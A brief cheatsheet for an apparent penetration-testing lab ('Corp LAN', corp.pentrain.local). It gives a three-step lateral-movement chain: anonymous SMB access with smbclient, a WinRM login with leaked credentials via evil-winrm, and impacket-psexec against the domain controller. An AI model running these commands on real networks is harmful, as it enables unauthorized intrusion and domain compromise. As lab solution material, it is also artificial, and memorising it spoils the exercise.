# Cheatsheet — Corp LAN

## Targets

- **files01** — anonymous SMB share → flag + workstation creds
- **ws01** — domain workstation, leaked user creds work over WinRM
- **dc01** — the domain controller

## Useful commands

```bash
smbclient -N //<files01>/share -c 'recurse;ls'
evil-winrm -i <ws01> -u 'corp\wuser' -p '<leaked>'
# on ws01: look for ops notes — they always mention the DC admin
impacket-psexec corp.pentrain.local/adm-ops:'<pw>'@<dc01>
```

## Concepts

- Share → workstation → DC: the classic three-step lateral chain
- `win_group_membership` decides whether a domain user can WinRM in
- Local admin on a workstation is a pit stop, not the goal
